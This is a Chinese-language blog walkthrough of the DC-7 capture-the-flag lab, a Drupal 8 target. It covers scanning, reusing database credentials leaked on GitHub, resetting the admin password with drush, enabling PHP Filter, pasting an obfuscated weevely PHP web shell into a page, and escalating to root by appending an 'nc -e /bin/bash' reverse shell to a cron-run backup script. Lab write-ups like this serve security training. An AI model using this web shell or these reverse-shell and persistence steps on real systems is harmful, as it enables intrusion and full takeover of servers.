---
title: DC-7靶场练习
date: 2021-12-31 19:23:04
tags: DC靶场系列
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-wy5176_1920x1080.png
---

# DC-7靶场练习

## 环境

kali:192.168.10.128

dc-7:192.168.10.196

## 信息收集

靶机发现：

```
netdiscover -r 192.168.10.0/24
```

![image-20211231193327034](https://raw.githubusercontent.com/todis21/image/main/img/image-20211231193327034.png)

端口扫描

```
nmap -sS -sV -T4 -A -p- 192.168.10.196
```

![image-20211231193607875](https://raw.githubusercontent.com/todis21/image/main/img/image-20211231193607875.png)

发现靶机打开了22(ssh)和80(http)端口

打开web端`http://192.168.10.196/`

![image-20211231194235606](https://raw.githubusercontent.com/todis21/image/main/img/image-20211231194235606.png)

这个网站使用的CMS是Drupal8

![image-20211231194255615](https://raw.githubusercontent.com/todis21/image/main/img/image-20211231194255615.png)

第一反应就是使用searchsploit和MSF来寻找利用模块，但是尝试了好几个脚本和模块都没有拿到shell



翻译一下首页的内容，获取到一点点线索，并且得到线索在框外部

```
欢迎来到 DC-7
DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)

虽然这个挑战并不是那么技术性的，但如果你需要诉诸蛮力或字典攻击，你可能不会成功。

您必须做的是“跳出”框框思考。

方法在“外”框。 :-)
```



回到网页发现Drupal是被DIY过的，重点看首页的footer部分，也就是网页的最下方的黑色区域，靶机的除了"Powered by Drupal"，还多了一个"@DC7USER"。谷歌搜索"@DC7USER"

![image-20220104112000213](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104112000213.png)

这是他的项目，可以在github上查看源码，找到配置文件`config.php`

![image-20220104112445470](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104112445470.png)

```
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```

在这个文件中可以看到账号密码，

使用ssh连接,并且能够连接成功

```
ssh dc7user@192.168.10.196
```

![image-20220104113501353](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104113501353.png)

在这个目录下有两个文件，文件夹backups里面有`website.sql.gpg  website.tar.gz.gpg`这两个文件

经过百度了解到这两个是加密文件，没有利用的地方

再查看一下mbox,这里有许多长得差不多的邮件信息,发现是一个计划任务：自动备份数据库的执行情况，调用的脚本是/opt/scripts/backups.sh，是root权限执行的。

![image-20220104115113148](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104115113148.png)

## 拿shell

进入/opt/scripts/这个目录,查看backups.sh这个文件,内容如下：

```
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

在这里可以看到有两个比较少见的命令`drush`和`gpg`

经过百度得知drush命令是drupal的一套shell脚本或bat脚本，这个可以用来修改网站的admin账号的密码

```
drush user-password admin --password="123456"
```

这个命令要在/var/www/html目录下才能执行

![image-20220104202027758](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104202027758.png)

修改了密码后，去登录

登录成功后

![image-20220104203208177](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203208177.png)

![image-20220104203232079](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203232079.png)

![image-20220104203258438](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203258438.png)

在这里可以写入网页，但是网页类型没有php模式

![image-20220104203620587](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203620587.png)

这里需要自己安装插件,下载连接：

```
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
```

下载完成后，点击`Extend->+ install new module`选择刚下载的文件进行安装

![image-20220104204357472](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104204357472.png)

安装完成后点击Extend往下拉，勾选并启用PHP Filter模块，点击install

完成后回到写入网页的页面，可以发现这里能写php代码了

![image-20220104204924769](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104204924769.png)

用weevely生成一个木马

```
weevely generate cmd shell.php
```

* generate 代表生成木马

* a 为木马连接时的密码

* a.php 为木马的文件名

将shell.php的内容复制到Body里，title随便写，点击save

```php
<?php
$r='o.=$t{$i}^QE$k{QE$j};}QE}rQEeturnQE $o;}if (@preg_QEmaQEtch("/$kQEh(.+)QE$kf/",@QEfiQEle_get_conteQEQEnts("php://iQEQE';
$z=str_replace('EJ','','EJcreEJateEJEJ_funcEJEJtion');
$d='{$QEc=strlQEeQEQEn($k);$l=strQElen($t);$QEo=QE"";for($i=QE0;$i<$lQE;QE){for($j=QE0;QE($j<$c&QE&$i<QE$l);$j++,$QEi++){$QE';
$J='contQEents();QE@ob_enQEd_cleaQEn(QE);$r=@basQEe64_QEencode(@xQE(@gzcomQEprQEess($o),$kQE)QE);pQEriQEnt("$p$kh$r$kf");}';
$j='$k="QEdfff0aQE7f";$kh="QEa1aQE55c8c1a49"QE;QE$kf="66c1QE9f6da452"QE;$pQE="6nMQEW0DQEI50PmP4TH8";QEQEfunctioQEn x($t,$k)';
$X='nput")QEQE,$m)QE==1) {@obQE_start();@evaQEl(QE@gzunQEcompress(@x(@baQEse6QE4_decodeQEQE($m[1]),$k))QE);$o=@oQEQEb_get_';
$G=str_replace('QE','',$j.$d.$r.$X.$J);
$N=$z('',$G);$N();
?>
```



![image-20220104212119928](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212119928.png)

得到木马地址`http://192.168.10.196/node/5`

![image-20220104212256254](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212256254.png)

用接下来用weevely进行连接

```
weevely http://192.168.10.196/node/5 cmd
```

![image-20220104212335214](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212335214.png)

成功拿到shell

## 提权

由上面可知，`/opt/scripts/backups.sh`脚本执行是root权限，所以只要把反弹shell命令写入该脚本即可得到root权限

```
echo 'nc -e /bin/bash 192.168.10.128 1234'>>/opt/scripts/backups.sh
```

![image-20220104213207189](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104213207189.png)

kali这边

```
rlwrap nc -lvvp 1234
```



写入成功，等待其自动执行

反弹shell成功，并拿到root权限

![image-20220104215415008](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104215415008.png)

```
cd /root
cat theflag.txt
```

拿到flag

![image-20220104215600625](https://raw.githubusercontent.com/todis21/image/main/img/image-20220104215600625.png)
